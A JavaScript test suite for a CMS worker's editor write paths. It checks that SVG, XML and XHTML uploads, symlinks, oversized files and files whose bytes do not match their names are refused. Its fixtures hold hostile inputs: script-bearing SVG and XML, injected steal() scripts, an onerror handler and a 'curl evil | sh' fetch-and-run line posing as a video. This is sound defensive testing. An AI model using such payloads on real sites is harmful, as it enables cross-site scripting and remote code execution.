/**
 * What an invited editor's session can and cannot WRITE, driven through the
 * worker's real request handlers with an in-memory KV and a stand-in GitHub
 * (test/worker-harness.js). Covers every editor write path:
 *
 *   PUT  /gh/…/contents/<path>        one file
 *   POST /gh/…/git/blobs|trees|commits  staged uploads and multi-file commits
 *   POST /schedule, /suggestions, /source/revert, PATCH /api/v1/edits
 *
 * KLN-01: active document types (SVG, XML, XSL, XHTML…) never get through.
 * KLN-02: uploads have a size ceiling and must hold what their name says.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import worker, { apiPageCandidates, apiPageFilter } from '../worker/index.js';
import { UPLOAD_MAX_BYTES, FILE_MESSAGES } from '../src/file-policy.js';
import {
  REPO, SESSION, ORIGIN, editorEnv, fakeKV, withFetch, call, b64, jsonRes, githubWrites, SAMPLES, SVG_SCRIPT,
} from './worker-harness.js';

const GH = 'https://api.github.com';
const PAGE = '<!doctype html><html><head><title>Hi</title></head><body><h1 data-cms="t">Hello</h1><script src="/assets/kiln.js" defer></script></body></html>';

/** GitHub accepts every write and answers blob reads from `blobs` (sha → text). */
const acceptAll = (blobs = {}) => async (url, init) => {
  if (init.method === 'PUT' || init.method === 'POST' || init.method === 'PATCH') return jsonRes({ content: {}, commit: { sha: 'c1' }, sha: 'new' }, 201);
  const m = /\/git\/blobs\/(\w+)/.exec(url);
  if (m && blobs[m[1]] !== undefined) return jsonRes({ content: b64(blobs[m[1]]), encoding: 'base64' });
};
const put = (env, path, bytes, extra = {}) =>
  call(env, 'PUT', `/gh/repos/${REPO}/contents/${path}`, { body: { message: 'x', content: b64(bytes), branch: 'main', ...extra } });

// ─── KLN-01 · one file through the proxy ─────────────────────────────────────

test('KLN-01 proxy PUT: an SVG carrying <script> is refused and never reaches GitHub', async () => {
  await withFetch(acceptAll(), async (calls) => {
    const r = await put(editorEnv(), 'assets/evil.svg', SVG_SCRIPT);
    assert.equal(r.status, 403);
    assert.equal(r.json.code, 'file_active');
    assert.equal(r.json.error, FILE_MESSAGES.active);
    assert.equal(r.json.path, 'assets/evil.svg');
    assert.equal(calls.length, 0, 'no call to GitHub at all');
  });
});

test('KLN-01 proxy PUT: an SVG with an onload= handler is refused the same way', async () => {
  await withFetch(acceptAll(), async (calls) => {
    const r = await put(editorEnv(), 'img/x.svg', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>');
    assert.equal(r.status, 403);
    assert.equal(githubWrites(calls).length, 0);
  });
});

test('KLN-01 proxy PUT: every XML-parsed document type is refused (xml, xsl, xslt, svgz, xhtml, xht, rss, atom, mathml)', async () => {
  for (const name of ['feed.xml', 'style.xsl', 'style.xslt', 'logo.svgz', 'page.xhtml', 'page.xht', 'feed.rss', 'feed.atom', 'eq.mathml', 'sitemap.xml']) {
    await withFetch(acceptAll(), async (calls) => {
      const r = await put(editorEnv(), name, '<?xml version="1.0"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>');
      assert.equal(r.status, 403, name);
      assert.equal(r.json.code, 'file_active', name);
      assert.equal(githubWrites(calls).length, 0, name);
    });
  }
});

test('KLN-01 proxy PUT: an .xhtml page is no longer treated as HTML — its namespaced script would have passed the HTML guard', async () => {
  // parse5 reads <x:script> as an unknown tag; a browser parsing the file as
  // XML runs it. Editors do not write XHTML at all.
  const xhtml = '<html xmlns="http://www.w3.org/1999/xhtml"><body><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script></body></html>';
  await withFetch(acceptAll(), async (calls) => {
    const r = await put(editorEnv(), 'page.xhtml', xhtml);
    assert.equal(r.status, 403);
    assert.equal(githubWrites(calls).length, 0);
  });
});

test('KLN-01 proxy PUT: types that are not on the list are refused too — content files, data, text, no extension', async () => {
  for (const name of ['notes.md', 'src/content/blog/post.mdx', 'data.json', 'robots.txt', 'x.php', 'README', '.htaccess',
    '.well-known/acme-challenge/token', 'legacy.doc', 'macro.docm', 'archive.zip']) {
    await withFetch(acceptAll(), async (calls) => {
      const r = await put(editorEnv(), name, 'anything');
      assert.equal(r.status, 415, name);
      assert.equal(r.json.code, 'file_type', name);
      assert.equal(r.json.error, FILE_MESSAGES.type, name);
      assert.equal(githubWrites(calls).length, 0, name);
    });
  }
});

test('KLN-01 proxy PUT: the last extension decides, in any letter case', async () => {
  await withFetch(acceptAll(), async (calls) => {
    assert.equal((await put(editorEnv(), 'assets/LOGO.SVG', SVG_SCRIPT)).status, 403);
    assert.equal((await put(editorEnv(), 'assets/photo.png.svg', SVG_SCRIPT)).status, 403);
    assert.equal((await put(editorEnv(), 'assets/photo.png.Svg', SVG_SCRIPT)).status, 403);
    // Named like an image: now its bytes are what count (KLN-02).
    assert.equal((await put(editorEnv(), 'assets/drawing.svg.png', SVG_SCRIPT)).json.code, 'file_mismatch');
    assert.equal(githubWrites(calls).length, 0);
  });
});

test('KLN-01 proxy PUT: the type gate does not depend on scope, and scope still applies to allowed types', async () => {
  await withFetch(acceptAll(), async (calls) => {
    // Out of scope AND a refused type: scope answers first (unchanged behaviour).
    const env = editorEnv({ paths: ['blog'] });
    assert.equal((await put(env, 'assets/evil.svg', SVG_SCRIPT)).json.error, 'outside your editing scope');
    assert.equal((await put(env, 'blog/evil.svg', SVG_SCRIPT)).json.code, 'file_active');
    assert.equal((await put(env, 'assets/a.png', SAMPLES.png)).json.error, 'outside your editing scope');
    assert.equal(githubWrites(calls).length, 0);
  });
});

test('KLN-01 proxy PUT: a normal page edit still goes through, attributed to the editor', async () => {
  const edited = PAGE.replace('Hello', 'Hello there');
  await withFetch(acceptAll({ cur: PAGE }), async (calls) => {
    const r = await put(editorEnv(), 'index.html', edited, { sha: 'cur' });
    assert.equal(r.status, 201);
    const w = githubWrites(calls);
    assert.equal(w.length, 1);
    assert.equal(w[0].url, `${GH}/repos/${REPO}/contents/index.html`);
    assert.equal(w[0].body.author.name, 'Sam (via Kiln)');
    assert.equal(Buffer.from(w[0].body.content, 'base64').toString(), edited);
  });
});

test('KLN-01 proxy PUT: the HTML content guard still blocks an injected script', async () => {
  await withFetch(acceptAll({ cur: PAGE }), async (calls) => {
    const r = await put(editorEnv(), 'index.html', PAGE.replace('</body>', '<script>steal()</script></body>'), { sha: 'cur' });
    assert.equal(r.status, 403);
    assert.match(r.json.error, /cannot add scripts/);
    assert.equal(githubWrites(calls).length, 0);
  });
});

test('KLN-01 proxy PUT: a stylesheet edit (the Theme panel) still goes through', async () => {
  await withFetch(acceptAll(), async (calls) => {
    const r = await put(editorEnv(), 'assets/site.css', ':root{--brand:#123456}', { sha: 'css1' });
    assert.equal(r.status, 201);
    assert.equal(githubWrites(calls).length, 1);
  });
});

// ─── KLN-01 · the git-data path (staged uploads, new posts, multi-file commits) ─

/**
 * A stand-in repo for the git-data flow. `before` / `after` are file lists
 * ({ path, bytes, mode? }) for the parent commit and the proposed tree. Blob
 * reads answer raw bytes when the raw media type is asked for (as GitHub
 * does), the JSON envelope otherwise.
 */
function gitRepo({ before = [], after, rawSupported = true, sizes = {}, failBlob = null }) {
  const shaOf = new Map();
  const blobs = new Map();
  const entries = (files) => files.map((f) => {
    const buf = Buffer.from(f.bytes);
    const key = buf.toString('base64');
    if (!shaOf.has(key)) { shaOf.set(key, `blob${shaOf.size}`); blobs.set(shaOf.get(key), buf); }
    const e = { path: f.path, mode: f.mode || '100644', type: 'blob', sha: shaOf.get(key), size: sizes[f.path] ?? buf.length };
    if (f.noSize) delete e.size;
    return e;
  });
  const oldTree = entries(before), newTree = entries(after);
  return async (url, init) => {
    if (init.method === 'POST' && url.endsWith('/git/commits')) return jsonRes({ sha: 'newcommit' }, 201);
    if (init.method !== 'GET') return jsonRes({ sha: 'x' }, 201);
    if (url.includes('/git/trees/newtree')) return jsonRes({ tree: newTree, truncated: false });
    if (url.includes('/git/trees/oldtree')) return jsonRes({ tree: oldTree, truncated: false });
    if (url.includes('/git/commits/parent')) return jsonRes({ tree: { sha: 'oldtree' } });
    const m = /\/git\/blobs\/(\w+)/.exec(url);
    if (m && blobs.has(m[1])) {
      if (failBlob === m[1] || failBlob === 'all') return jsonRes({ message: 'Server Error' }, 500);
      const wantsRaw = String(init.headers?.Accept || '').includes('raw');
      if (wantsRaw && rawSupported) return new Response(blobs.get(m[1]), { headers: { 'X-GitHub-Media-Type': 'github.v3; param=raw; format=json' } });
      return jsonRes({ content: blobs.get(m[1]).toString('base64'), encoding: 'base64' }, 200, { 'X-GitHub-Media-Type': 'github.v3; format=json' });
    }
  };
}
const commit = (env) => call(env, 'POST', `/gh/repos/${REPO}/git/commits`, { body: { message: 'Upload 1 file (via Kiln)', tree: 'newtree', parents: ['parent'] } });
const SITE = [{ path: 'index.html', bytes: PAGE }];
const commitsMade = (calls) => calls.filter(c => c.method === 'POST' && c.url.endsWith('/git/commits'));

test('KLN-01 git-data commit: a staged upload that is an SVG is refused, and no commit is made', async () => {
  await withFetch(gitRepo({ before: SITE, after: [...SITE, { path: 'assets/uploads/evil.svg', bytes: SVG_SCRIPT }] }), async (calls) => {
    const r = await commit(editorEnv());
    assert.equal(r.status, 403);
    assert.equal(r.json.code, 'file_active');
    assert.equal(r.json.path, 'assets/uploads/evil.svg');
    assert.equal(commitsMade(calls).length, 0);
  });
});

test('KLN-01 git-data commit: xml / xsl / xhtml / md are refused, whatever else rides along', async () => {
  for (const name of ['assets/files/feed.xml', 'assets/files/t.xsl', 'page.xhtml', 'src/content/post.md', 'robots.txt']) {
    await withFetch(gitRepo({ before: SITE, after: [...SITE, { path: 'assets/uploads/ok.png', bytes: SAMPLES.png }, { path: name, bytes: '<x/>' }] }), async (calls) => {
      const r = await commit(editorEnv());
      assert.ok(r.status === 403 || r.status === 415, `${name} → ${r.status}`);
      assert.equal(r.json.path, name);
      assert.equal(commitsMade(calls).length, 0, name);
    });
  }
});

test('KLN-01 git-data commit: replacing an existing SVG the owner committed is refused as well', async () => {
  const owner = [...SITE, { path: 'img/logo.svg', bytes: '<svg xmlns="http://www.w3.org/2000/svg"/>' }];
  await withFetch(gitRepo({ before: owner, after: [...SITE, { path: 'img/logo.svg', bytes: SVG_SCRIPT }] }), async (calls) => {
    const r = await commit(editorEnv());
    assert.equal(r.status, 403);
    assert.equal(commitsMade(calls).length, 0);
  });
});

test('KLN-01 git-data commit: a symlink named like a page is refused (it would serve another file\'s bytes as HTML)', async () => {
  await withFetch(gitRepo({ before: SITE, after: [...SITE, { path: 'evil.html', bytes: 'assets/uploads/polyglot.png', mode: '120000' }] }), async (calls) => {
    const r = await commit(editorEnv());
    assert.equal(r.status, 403);
    assert.equal(r.json.error, 'editors may only commit regular files');
    assert.equal(commitsMade(calls).length, 0);
  });
});

test('KLN-01 git/trees: a refused type or a symlink is turned away before the tree is even created', async () => {
  const tree = (entries) => call(editorEnv(), 'POST', `/gh/repos/${REPO}/git/trees`, { body: { base_tree: 'oldtree', tree: entries } });
  await withFetch(acceptAll(), async (calls) => {
    const svg = await tree([{ path: 'assets/uploads/evil.svg', mode: '100644', type: 'blob', sha: 'b1' }]);
    assert.equal(svg.status, 403);
    assert.equal(svg.json.code, 'file_active');
    const inline = await tree([{ path: 'feed.xml', mode: '100644', type: 'blob', content: '<x/>' }]);
    assert.equal(inline.status, 403);
    const link = await tree([{ path: 'page.html', mode: '120000', type: 'blob', sha: 'b1' }]);
    assert.equal(link.json.error, 'editors may only commit regular files');
    const sub = await tree([{ path: 'vendor', mode: '160000', type: 'commit', sha: 'b1' }]);
    assert.equal(sub.status, 403);
    assert.equal(githubWrites(calls).length, 0);
    // What the editor really sends — pages and images as regular files — passes.
    const fine = await tree([{ path: 'index.html', mode: '100644', type: 'blob', sha: 'b1' }, { path: 'assets/uploads/a.webp', mode: '100644', type: 'blob', sha: 'b2' }]);
    assert.equal(fine.status, 201);
    // Removing a file (sha: null) is not something an editor session does.
    assert.equal((await tree([{ path: 'old.html', mode: '100644', type: 'blob', sha: null }])).json.code, 'no_delete');
  });
});

test('KLN-01 git-data commit: uploads of allowed types still commit', async () => {
  const after = [...SITE, { path: 'assets/uploads/img-abc.webp', bytes: SAMPLES.webp }, { path: 'assets/files/minutes.pdf', bytes: SAMPLES.pdf }];
  await withFetch(gitRepo({ before: SITE, after }), async (calls) => {
    assert.equal((await commit(editorEnv())).status, 201);
    assert.equal(commitsMade(calls).length, 1);
    assert.equal(commitsMade(calls)[0].body.author.name, 'Sam (via Kiln)');
  });
});

test('KLN-01 git-data commit: a new post (HTML) is still content-guarded on this path', async () => {
  const post = PAGE.replace('Hello', 'New post');
  await withFetch(gitRepo({ before: SITE, after: [...SITE, { path: 'blog/new.html', bytes: post }] }), async (calls) => {
    assert.equal((await commit(editorEnv())).status, 201);
    assert.equal(commitsMade(calls).length, 1);
  });
  await withFetch(gitRepo({ before: SITE, after: [...SITE, { path: 'blog/new.html', bytes: post.replace('</body>', '<script>x()</script></body>') }] }), async (calls) => {
    const r = await commit(editorEnv());
    assert.equal(r.status, 403);
    assert.match(r.json.error, /cannot add scripts/);
    assert.equal(commitsMade(calls).length, 0);
  });
});

// ─── KLN-01 · the other editor write paths ───────────────────────────────────

test('KLN-01 API tokens: an .xhtml or .svg path is not a page a token can list or edit', () => {
  assert.deepEqual(apiPageCandidates('/page.xhtml', ['']), { error: 400 });
  assert.deepEqual(apiPageCandidates('/logo.svg', ['']), { error: 400 });
  assert.deepEqual(apiPageCandidates('/feed.xml', ['']), { error: 400 });
  assert.deepEqual(apiPageCandidates('/about.html', ['']), { candidates: ['about.html'] });
  const tree = [{ type: 'blob', path: 'index.html' }, { type: 'blob', path: 'page.xhtml' }, { type: 'blob', path: 'old.htm' }, { type: 'blob', path: 'logo.svg' }];
  assert.deepEqual(apiPageFilter(tree, ['']), ['index.html', 'old.htm']);
});

test('KLN-01 PATCH /api/v1/edits: a token cannot aim field edits at an XML document', async () => {
  const env = { ALLOWED_ORIGINS: ORIGIN, KILN: fakeKV({ [`itok:${REPO}`]: 'installation-token' }) };
  const secret = 'b'.repeat(64);
  const hash = [...new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(secret)))].map(x => x.toString(16).padStart(2, '0')).join('');
  await env.KILN.put(`atok:${hash}`, JSON.stringify({ id: 'abcd1234', repo: REPO, name: 'bot', paths: [''], keys: [], readonly: false, exp: null }));
  await withFetch(acceptAll(), async (calls) => {
    const r = await call(env, 'PATCH', '/api/v1/edits', { session: null, headers: { Authorization: `Bearer ${secret}` },
      body: { path: '/page.xhtml', edits: [{ key: 't', html: '<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>' }] } });
    assert.equal(r.status, 400);
    assert.equal(r.json.error, 'not an HTML page path');
    assert.equal(calls.length, 0);
  });
});

test('KLN-01 POST /schedule: an editor cannot schedule field edits against anything but an HTML page', async () => {
  const at = new Date(Date.now() + 3600e3).toISOString();
  const sched = (env, path) => call(env, 'POST', '/schedule', { body: { repo: REPO, path, edits: [{ key: 't', html: 'Hi' }], at } });
  await withFetch(acceptAll(), async () => {
    for (const path of ['page.xhtml', 'logo.svg', 'feed.xml', 'src/content/post.md']) {
      const env = editorEnv();
      const r = await sched(env, path);
      assert.equal(r.status, 403, path);
      assert.equal(r.json.error, 'editors can only schedule edits to HTML pages');
      assert.equal((await env.KILN.list({ prefix: 'sched:' })).keys.length, 0, path);
    }
    const env = editorEnv();
    assert.equal((await sched(env, 'index.html')).status, 200);
    assert.equal((await env.KILN.list({ prefix: 'sched:' })).keys.length, 1);
  });
});

test('KLN-01 cron: a stored editor schedule aimed at a non-HTML file is dropped, never committed', async () => {
  const env = editorEnv({}, {
    [`people:${REPO}`]: [{ email: 'sam@example.com', name: 'Sam', role: 'editor', days: 30, paths: [''] }],
    'sched:old1': { repo: REPO, path: 'page.xhtml', branch: 'main', edits: [{ key: 't', html: '<x:script xmlns:x="http://www.w3.org/1999/xhtml">x</x:script>' }], message: 'm', at: Date.now() - 1000, by: 'Sam', byEmail: 'sam@example.com', admin: false },
    'sched:ok2': { repo: REPO, path: 'index.html', branch: 'main', edits: [{ key: 't', html: 'Later' }], message: 'm', at: Date.now() - 1000, by: 'Sam', byEmail: 'sam@example.com', admin: false },
  });
  await withFetch(async (url, init) => {
    if (init.method === 'PUT') return jsonRes({ commit: { sha: 'c1' } }, 201);
    if (url.includes('/contents/')) return jsonRes({ sha: 'cur', content: b64(PAGE) });
  }, async (calls) => {
    await worker.scheduled({}, env);
    const writes = githubWrites(calls);
    assert.equal(writes.length, 1);
    assert.match(writes[0].url, /contents\/index\.html$/);
    assert.equal((await env.KILN.list({ prefix: 'sched:' })).keys.length, 0, 'both entries are gone: one fired, one dropped');
  });
});

test('KLN-01 suggestions: only HTML pages can be suggested on, and a stored suggestion for anything else is never applied', async () => {
  await withFetch(acceptAll(), async (calls) => {
    const env = editorEnv({ mode: 'suggest' });
    const r = await call(env, 'POST', '/suggestions', { body: { repo: REPO, path: 'page.xhtml', edits: [{ key: 't', html: 'Hi' }] } });
    assert.equal(r.status, 400);
    assert.equal(r.json.error, 'suggestions are for HTML pages');
    assert.equal((await call(env, 'POST', '/suggestions', { body: { repo: REPO, path: 'index.html', edits: [{ key: 't', html: 'Hi' }] } })).status, 200);
    assert.equal(calls.length, 0);
  });
  // An older record aimed at an XML document: an owner's Approve does not apply it.
  const env = { ALLOWED_ORIGINS: ORIGIN, KILN: fakeKV({
    [`itok:${REPO}`]: 'installation-token',
    [`sug:${REPO}:aaaaaaaaaaaa`]: { id: 'aaaaaaaaaaaa', page: 'page.xhtml', by: 'Sam', email: 'sam@example.com', ts: 1, note: '', edits: [{ key: 't', html: 'x' }], status: 'open' },
  }) };
  await withFetch(async (url, init) => {
    if (url === `${GH}/repos/${REPO}` && init.method === 'GET') return jsonRes({ permissions: { push: true } });
    if (init.method === 'PUT') return jsonRes({ commit: { sha: 'c1' } }, 201);
  }, async (calls) => {
    const r = await call(env, 'POST', '/suggestions/decide', { session: null, headers: { Authorization: 'Bearer owner-token' }, body: { repo: REPO, id: 'aaaaaaaaaaaa', approve: true } });
    assert.equal(r.status, 422);
    assert.equal(githubWrites(calls).length, 0);
  });
});

// /source/revert restores a file to its content at ANY commit the caller names.
const revertRepo = ({ current, old, file = 'index.html' }) => async (url, init) => {
  if (init.method === 'PUT') return jsonRes({ commit: { sha: 'c9', parents: [{ sha: 'p' }] } }, 201);
  if (url === `${GH}/repos/${REPO}` && init.method === 'GET') return jsonRes({ permissions: { push: true } });
  if (url.includes(`/contents/${encodeURIComponent(file)}?ref=${'f'.repeat(40)}`)) return jsonRes({ sha: 'old', content: b64(old) });
  if (url.includes(`/contents/${encodeURIComponent(file)}?ref=main`)) return current === null ? undefined : jsonRes({ sha: 'cur', content: b64(current) });
};
const revert = (env, file, opts = {}) => call(env, 'POST', '/source/revert', { body: { repo: REPO, file, toSha: 'f'.repeat(40) }, ...opts });

test('KLN-01 /source/revert: an editor cannot restore a version that brings a script with it', async () => {
  const old = PAGE.replace('</body>', '<script>steal()</script></body>');
  await withFetch(revertRepo({ current: PAGE, old }), async (calls) => {
    const r = await revert(editorEnv(), 'index.html');
    assert.equal(r.status, 403);
    assert.equal(r.json.error, 'That version would add scripts to the page, so only the site owner can restore it.');
    assert.equal(githubWrites(calls).length, 0);
  });
  // Same for a content file a generator builds into a page.
  const md = '---\ntitle: Hi\n---\nBody text.\n';
  await withFetch(revertRepo({ current: md, old: md + '<img src=x onerror="steal()">\n', file: 'src/content/blog/post.md' }), async (calls) => {
    const r = await revert(editorEnv(), 'src/content/blog/post.md');
    assert.equal(r.status, 403);
    assert.equal(githubWrites(calls).length, 0);
  });
  // And for a file that was deleted at head: only what a brand-new page may carry.
  await withFetch(revertRepo({ current: null, old }), async (calls) => {
    assert.equal((await revert(editorEnv(), 'index.html')).status, 403);
    assert.equal(githubWrites(calls).length, 0);
  });
});

test('KLN-01 /source/revert: undoing a text change still works for an editor; the owner is not held to the guard', async () => {
  await withFetch(revertRepo({ current: PAGE.replace('Hello', 'Helo wrld'), old: PAGE }), async (calls) => {
    const r = await revert(editorEnv(), 'index.html');
    assert.equal(r.status, 200);
    const w = githubWrites(calls);
    assert.equal(w.length, 1);
    assert.equal(Buffer.from(w[0].body.content, 'base64').toString(), PAGE);
  });
  const old = PAGE.replace('</body>', '<script>analytics()</script></body>');
  await withFetch(revertRepo({ current: PAGE, old }), async (calls) => {
    const env = { ALLOWED_ORIGINS: ORIGIN, KILN: fakeKV({ [`itok:${REPO}`]: 'installation-token' }) };
    const r = await revert(env, 'index.html', { session: null, headers: { Authorization: 'Bearer owner-token' } });
    assert.equal(r.status, 200);
    assert.equal(githubWrites(calls).length, 1);
  });
});

test('KLN-01 /source/revert and /source/duplicate: XML documents are not editable files', async () => {
  await withFetch(acceptAll(), async (calls) => {
    for (const file of ['page.xhtml', 'logo.svg', 'feed.xml']) {
      const r = await revert(editorEnv(), file);
      assert.equal(r.status, 400, file);
      assert.equal(r.json.error, 'file type not editable', file);
      const d = await call(editorEnv(), 'POST', '/source/duplicate', { body: { repo: REPO, file } });
      assert.equal(d.status, 400, file);
    }
    assert.equal(calls.length, 0);
  });
});

// ─── KLN-02 · size ceiling and leading bytes ─────────────────────────────────

test('KLN-02 proxy PUT: bytes that are not what the name says are refused (415), nothing reaches GitHub', async () => {
  const cases = [
    ['assets/uploads/photo.png', 'MZ\x90\x00 this is a program, not a picture'],
    ['assets/uploads/photo.jpg', SVG_SCRIPT],
    ['assets/files/report.pdf', '<html><script>alert(1)</script></html>'],
    ['assets/fonts/brand.woff2', SAMPLES.zip],
    ['assets/files/agenda.docx', SAMPLES.pdf],
    ['assets/media/clip.mp4', '#!/bin/sh\ncurl evil | sh'],
    ['assets/uploads/empty.png', ''],
  ];
  for (const [path, bytes] of cases) {
    await withFetch(acceptAll(), async (calls) => {
      const r = await put(editorEnv(), path, bytes);
      assert.equal(r.status, 415, path);
      assert.equal(r.json.code, 'file_mismatch', path);
      assert.equal(r.json.path, path);
      assert.equal(githubWrites(calls).length, 0, path);
    });
  }
});

test('KLN-02 proxy PUT: every allowed upload type goes through when its bytes match', async () => {
  const cases = { 'a.png': 'png', 'a.jpg': 'jpeg', 'a.gif': 'gif', 'a.webp': 'webp', 'a.avif': 'avif', 'favicon.ico': 'ico', 'a.pdf': 'pdf',
    'a.woff2': 'woff2', 'a.ttf': 'ttf', 'a.mp3': 'mp3', 'a.mp4': 'mp4', 'a.webm': 'webm', 'a.wav': 'wav', 'a.docx': 'zip', 'a.xlsx': 'zip' };
  for (const [name, sample] of Object.entries(cases)) {
    await withFetch(acceptAll(), async (calls) => {
      const r = await put(editorEnv(), `assets/files/${name}`, SAMPLES[sample]);
      assert.equal(r.status, 201, name);
      assert.equal(githubWrites(calls).length, 1, name);
    });
  }
});

test('KLN-02 proxy PUT: 15 MB is the ceiling — one byte over is a 413, exactly 15 MB goes through', async () => {
  const png = (n) => { const b = Buffer.alloc(n, 0); Buffer.from(SAMPLES.png).copy(b, 0, 0, 8); return b; };
  await withFetch(acceptAll(), async (calls) => {
    const over = await put(editorEnv(), 'assets/uploads/huge.png', png(UPLOAD_MAX_BYTES + 1));
    assert.equal(over.status, 413);
    assert.equal(over.json.code, 'file_size');
    assert.equal(over.json.error, 'That file is too big. The limit is 15 MB.');
    assert.equal(githubWrites(calls).length, 0);
    const at = await put(editorEnv(), 'assets/uploads/big.png', png(UPLOAD_MAX_BYTES));
    assert.equal(at.status, 201);
    assert.equal(githubWrites(calls).length, 1);
  });
});

test('KLN-02 proxy: a body over the transport cap is refused before it is parsed — by Content-Length, or as it streams', async () => {
  await withFetch(acceptAll(), async (calls) => {
    // Declared too large: refused on the header alone.
    const declared = await call(editorEnv(), 'PUT', `/gh/repos/${REPO}/contents/assets/a.png`, { body: '{}', headers: { 'Content-Length': String(40 * 1024 * 1024) } });
    assert.equal(declared.status, 413);
    assert.equal(declared.json.code, 'file_size');
    // No length declared: the read stops once the cap is passed.
    let sent = 0;
    const chunk = new Uint8Array(1024 * 1024).fill(0x41);
    const stream = new ReadableStream({ pull(c) { if (sent++ < 64) c.enqueue(chunk); else c.close(); } });
    const res = await worker.fetch(new Request(`https://worker.example/gh/repos/${REPO}/git/blobs`, {
      method: 'POST', body: stream, duplex: 'half', headers: { 'X-Kiln-Session': SESSION, Origin: ORIGIN } }), editorEnv());
    assert.equal(res.status, 413);
    assert.ok(sent < 40, `stopped reading early (pulled ${sent} MB of 64)`);
    assert.equal(calls.length, 0);
  });
});

test('KLN-02 git/blobs: a blob over the ceiling is refused when it is created (base64 or text)', async () => {
  const blob = (body) => call(editorEnv(), 'POST', `/gh/repos/${REPO}/git/blobs`, { body });
  await withFetch(acceptAll(), async (calls) => {
    const big = await blob({ content: Buffer.alloc(UPLOAD_MAX_BYTES + 1, 1).toString('base64'), encoding: 'base64' });
    assert.equal(big.status, 413);
    assert.equal(big.json.error, FILE_MESSAGES.size);
    const text = await blob({ content: 'é'.repeat(UPLOAD_MAX_BYTES / 2 + 1), encoding: 'utf-8' });   // 2 bytes each
    assert.equal(text.status, 413);
    assert.equal(githubWrites(calls).length, 0);
    assert.equal((await blob({ content: Buffer.from(SAMPLES.png).toString('base64'), encoding: 'base64' })).status, 201);
    assert.equal((await blob({ content: PAGE, encoding: 'utf-8' })).status, 201);
  });
});

test('KLN-02 git-data commit: real uploads go through — images, a PDF, a Word file — reading only their first bytes', async () => {
  const after = [...SITE,
    { path: 'assets/uploads/img-abc.webp', bytes: Buffer.concat([Buffer.from(SAMPLES.webp), Buffer.alloc(5000, 3)]) },
    { path: 'assets/uploads/master-abc.webp', bytes: SAMPLES.png },          // PNG bytes under .webp: same family
    { path: 'assets/files/minutes.pdf', bytes: SAMPLES.pdf },
    { path: 'assets/files/agenda.docx', bytes: SAMPLES.zip }];
  await withFetch(gitRepo({ before: SITE, after }), async (calls) => {
    const r = await commit(editorEnv());
    assert.equal(r.status, 201);
    assert.equal(commitsMade(calls).length, 1);
    assert.equal(commitsMade(calls)[0].body.author.name, 'Sam (via Kiln)');
    const reads = calls.filter(c => /\/git\/blobs\//.test(c.url));
    assert.equal(reads.length, 4);
    for (const c of reads) assert.match(String(c.headers.Accept), /vnd\.github\.raw/);
  });
});

test('KLN-02 git-data commit: an oversized file is refused from the tree listing, without downloading it', async () => {
  const after = [...SITE, { path: 'assets/files/huge.pdf', bytes: SAMPLES.pdf }];
  await withFetch(gitRepo({ before: SITE, after, sizes: { 'assets/files/huge.pdf': UPLOAD_MAX_BYTES + 1 } }), async (calls) => {
    const r = await commit(editorEnv());
    assert.equal(r.status, 413);
    assert.equal(r.json.code, 'file_size');
    assert.equal(r.json.path, 'assets/files/huge.pdf');
    assert.equal(calls.filter(c => /\/git\/blobs\//.test(c.url)).length, 0);
    assert.equal(commitsMade(calls).length, 0);
  });
});

test('KLN-02 git-data commit: a staged upload whose bytes do not match its name is refused', async () => {
  for (const [path, bytes] of [['assets/uploads/img-x.webp', SVG_SCRIPT], ['assets/files/report.pdf', '<html><script>x</script>'], ['assets/uploads/a.png', '']]) {
    await withFetch(gitRepo({ before: SITE, after: [...SITE, { path, bytes }] }), async (calls) => {
      const r = await commit(editorEnv());
      assert.equal(r.status, 415, path);
      assert.equal(r.json.code, 'file_mismatch', path);
      assert.equal(commitsMade(calls).length, 0, path);
    });
  }
});

test('KLN-02 git-data commit: works the same if GitHub answers a blob read with its JSON envelope', async () => {
  await withFetch(gitRepo({ before: SITE, after: [...SITE, { path: 'assets/uploads/a.png', bytes: SAMPLES.png }], rawSupported: false }), async (calls) => {
    assert.equal((await commit(editorEnv())).status, 201);
    assert.equal(commitsMade(calls).length, 1);
  });
  await withFetch(gitRepo({ before: SITE, after: [...SITE, { path: 'assets/uploads/a.png', bytes: SVG_SCRIPT }], rawSupported: false }), async (calls) => {
    assert.equal((await commit(editorEnv())).status, 415);
    assert.equal(commitsMade(calls).length, 0);
  });
});

test('KLN-02 git-data commit: fails closed when a file cannot be checked', async () => {
  const after = [...SITE, { path: 'assets/uploads/a.png', bytes: SAMPLES.png }];
  await withFetch(gitRepo({ before: SITE, after, failBlob: 'all' }), async (calls) => {
    const r = await commit(editorEnv());
    assert.equal(r.status, 502);
    assert.equal(commitsMade(calls).length, 0);
  });
  await withFetch(gitRepo({ before: SITE, after: [...SITE, { path: 'assets/uploads/a.png', bytes: SAMPLES.png, noSize: true }] }), async (calls) => {
    assert.equal((await commit(editorEnv())).status, 502);
    assert.equal(commitsMade(calls).length, 0);
  });
});

test('KLN-02 the owner is not behind the proxy: a GitHub token is not an editor session', async () => {
  // Admins write to api.github.com directly. The proxy only ever serves editor
  // sessions, so nothing here can gate (or be bypassed by) an owner's token.
  await withFetch(acceptAll(), async (calls) => {
    const r = await call(editorEnv(), 'PUT', `/gh/repos/${REPO}/contents/logo.svg`, { session: null, headers: { Authorization: 'Bearer owner-token' }, body: { content: b64(SVG_SCRIPT) } });
    assert.equal(r.status, 401);
    assert.equal(calls.length, 0);
  });
});
